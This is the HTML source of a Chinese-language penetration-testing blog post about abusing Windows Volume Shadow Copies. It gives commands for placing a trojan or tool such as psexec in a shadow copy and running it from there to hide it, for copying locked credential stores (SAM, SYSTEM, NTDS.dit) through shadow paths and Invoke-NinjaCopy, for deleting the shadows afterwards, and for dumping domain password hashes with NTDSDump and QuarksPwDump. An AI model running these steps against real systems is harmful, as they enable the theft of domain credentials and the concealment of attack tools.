@@ -1,0 +1,672 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="在一次内网渗透中，传的内网渗透工具一直都是放C盘的垃圾箱里，也没太注意细节，如果你有掌握在极短的时间里获取想要的东西可以不用太在意这些，除此之外系统正在使用的文件比如SAM是无法直接拷贝的；这次主要记录卷副本，通过Windows自带的命令来实现隐藏程序以及拷贝系统无法拷贝的文件。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Volume Shadow小技巧">
+<meta property="og:url" content="http://yoursite.com/2017/07/08/Volume-Shadow小技巧/index.html">
+<meta property="og:site_name" content="EvilAnne's Blog">
+<meta property="og:description" content="在一次内网渗透中，传的内网渗透工具一直都是放C盘的垃圾箱里，也没太注意细节，如果你有掌握在极短的时间里获取想要的东西可以不用太在意这些，除此之外系统正在使用的文件比如SAM是无法直接拷贝的；这次主要记录卷副本，通过Windows自带的命令来实现隐藏程序以及拷贝系统无法拷贝的文件。">
+<meta property="og:image" content="http://i.imgur.com/RJ0HpSJ.jpg">
+<meta property="og:image" content="http://i.imgur.com/nOV0Poq.jpg">
+<meta property="og:image" content="http://i.imgur.com/HlppbjV.jpg">
+<meta property="og:image" content="http://i.imgur.com/ajgSunC.jpg">
+<meta property="og:image" content="http://i.imgur.com/rT56Vh2.jpg">
+<meta property="og:updated_time" content="2017-07-09T08:21:17.296Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Volume Shadow小技巧">
+<meta name="twitter:description" content="在一次内网渗透中，传的内网渗透工具一直都是放C盘的垃圾箱里，也没太注意细节，如果你有掌握在极短的时间里获取想要的东西可以不用太在意这些，除此之外系统正在使用的文件比如SAM是无法直接拷贝的；这次主要记录卷副本，通过Windows自带的命令来实现隐藏程序以及拷贝系统无法拷贝的文件。">
+<meta name="twitter:image" content="http://i.imgur.com/RJ0HpSJ.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+  <title> Volume Shadow小技巧 | EvilAnne's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">EvilAnne's Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Volume Shadow小技巧
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2017-07-08T17:08:09+08:00" content="2017-07-08">
+              2017-07-08
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2017/07/08/Volume-Shadow小技巧/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/07/08/Volume-Shadow小技巧/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="http://i.imgur.com/RJ0HpSJ.jpg" alt=""></p>
+<blockquote>
+<p>在一次内网渗透中，传的内网渗透工具一直都是放C盘的垃圾箱里，也没太注意细节，如果你有掌握在极短的时间里获取想要的东西可以不用太在意这些，除此之外系统正在使用的文件比如SAM是无法直接拷贝的；这次主要记录卷副本，通过Windows自带的命令来实现隐藏程序以及拷贝系统无法拷贝的文件。</p>
+</blockquote>
+<a id="more"></a>
+<h3 id="什么是卷影副本"><a href="#什么是卷影副本" class="headerlink" title="什么是卷影副本?"></a>什么是卷影副本?</h3><p>卷影副本，也称为快照，是存储在 Data Protection Manager (DPM) 服务器上的副本的时间点副本。副本是文件服务器上单个卷的受保护共享、文件夹和文件的完整时间点副本。</p>
+<h4 id="支持操作系统"><a href="#支持操作系统" class="headerlink" title="支持操作系统!"></a>支持操作系统!</h4><p>Windows Server 2003, Windows Server 2008, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2012, Windows 8</p>
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>Powershell下执行：<br><code>gwmi Win32_ShadowCopy|select -Property DeviceObject</code>查看是否有创建卷影<br><img src="http://i.imgur.com/nOV0Poq.jpg" alt=""><br>当前系统没有显示为空</p>
+<h4 id="vssadmin命令"><a href="#vssadmin命令" class="headerlink" title="vssadmin命令"></a>vssadmin命令</h4><p>常用命令：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vssadmin List Shadows  列出现有卷影副本</span><br><span class="line">Add ShadowStorage     - 新加卷影副本存储关联</span><br><span class="line">Create Shadow         - 创建新的卷影副本</span><br><span class="line">Delete Shadows        - 删除卷影副本</span><br><span class="line">Delete ShadowStorage  - 删除卷影副本存储关联</span><br><span class="line">List Providers        - 列出已注册的卷影副本提供程序</span><br><span class="line">List Shadows          - 列出现有卷影副本</span><br><span class="line">List ShadowStorage    - 列出卷影副本存储关联</span><br><span class="line">List Volumes          - 列出可以进行卷影副本处理的卷</span><br><span class="line">List Writers          - 列出订阅的卷影副本写入程序</span><br><span class="line">Resize ShadowStorage  - 重新调整卷影副本存储关联的大小</span><br><span class="line">Revert Shadow         - 将卷还原到卷影副本</span><br><span class="line">Query Reverts         - 查询正在进行的还原操作的进度。</span><br></pre></td></tr></table></figure>
+<h4 id="创建卷副本"><a href="#创建卷副本" class="headerlink" title="创建卷副本"></a>创建卷副本</h4><p>在开始之前:<br>1.需要先创建好目录，并放入木马或程序<br>2.再创建新的卷影副本,利用卷影副本卷名来执行程序，并把卷影副本卷名中的 “?” 需要改为 “.”号执行程序</p>
+<p>在创建副本之前需要把我们工具先放入目录中：<br><img src="http://i.imgur.com/HlppbjV.jpg" alt=""></p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vssadmin Create Shadow /<span class="keyword">for</span>=C：		创建新的卷影副本 </span><br><span class="line">成功地创建了 'C:\' 的卷影副本</span><br><span class="line">    卷影副本 ID: &#123;<span class="number">33</span>d2c8f4-c82d-<span class="number">45</span>fa-b9a7-<span class="number">4458</span>ee264d54&#125;</span><br><span class="line">    卷影副本卷名: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4</span><br></pre></td></tr></table></figure>
+<p>再查看：<br><img src="http://i.imgur.com/ajgSunC.jpg" alt=""></p>
+<p>执行程序：<br><code>\\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\test\psexec.exe</code><br><img src="http://i.imgur.com/rT56Vh2.jpg" alt=""></p>
+<h4 id="Copy-Files"><a href="#Copy-Files" class="headerlink" title="Copy Files"></a>Copy Files</h4><p>有些系统运行中的文件是不可复制的，比如像SAM</p>
+<p><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\</code><br><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SAM C:\</code><br><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM C:\</code></p>
+<p>PowerShell调用方法：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-NinjaCopy -Path <span class="string">"C:\Windows\System32\config\SYSTEM"</span> -ComputerName SERVER -localDestination <span class="string">"C:\temp\SYSTEM"</span></span><br><span class="line">Invoke-NinjaCopy -Path <span class="string">"C:\Windows\NTDS\NTDS.dit"</span> -ComputerName SERVER -localDestination <span class="string">"C:\temp\NTDS.dit"</span></span><br></pre></td></tr></table></figure>
+<p>需要文件：<br><code>https://github.com/clymb3r/PowerShell/tree/master/Invoke-NinjaCopy</code></p>
+<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>除卷影副本，两条命令都可以使用。主要看具体情况<br><code>vssadmin Delete Shadows /shadow={ce51aaf6-5677-4423-86ac-45d064ef626e} /quiet</code><br><code>vssadmin Delete Shadows /For=C:</code></p>
+<hr>
+<p><code>reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters</code>查询NTDS路径<br>获取域数据库</p>
+<p><code>Windows\NTDS\ntds.dit</code><br><code>Windows\System32\config\SYSTEM</code><br><code>Windows\System32\config\SAM</code></p>
+<p>NTDSDump导出域数据库hash值：<br><code>NTDSDump.exe -f ntds.dit -s SYSTEM -h -t john -o save.txt</code><br>或者：<br>QuarksPwDump.exe<br><code>QuarksPwDump --dump-hash-domain --with-history</code><br>导出本机域控历史hash值</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/06/25/这段时间以来/" rel="next" title="这段时间以来">
+                <i class="fa fa-chevron-left"></i> 这段时间以来
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/07/16/命令Tricks/" rel="prev" title="命令Tricks!">
+                命令Tricks! <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2017/07/08/Volume-Shadow小技巧/"
+           data-title="Volume Shadow小技巧" data-url="http://yoursite.com/2017/07/08/Volume-Shadow小技巧/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="EvilAnne" />
+          <p class="site-author-name" itemprop="name">EvilAnne</p>
+          <p class="site-description motion-element" itemprop="description">比天赋更重要的是变强起来的勇气</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">128</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是卷影副本"><span class="nav-number">1.</span> <span class="nav-text">什么是卷影副本?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#支持操作系统"><span class="nav-number">1.1.</span> <span class="nav-text">支持操作系统!</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常用命令"><span class="nav-number">2.</span> <span class="nav-text">常用命令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#vssadmin命令"><span class="nav-number">2.1.</span> <span class="nav-text">vssadmin命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#创建卷副本"><span class="nav-number">2.2.</span> <span class="nav-text">创建卷副本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Copy-Files"><span class="nav-number">2.3.</span> <span class="nav-text">Copy Files</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#删除"><span class="nav-number">3.</span> <span class="nav-text">删除</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EvilAnne</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+  <span id="busuanzi_container_site_pv">访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"http://evilanne.duoshuo.com"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+      
+      <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+      <script src="/js/src/hook-duoshuo.js"></script>
+    
+  
+
+
+
+
+
+  
+  
+  
+
+  
+
+  
+ 
+  
+
+</body>
+</html>
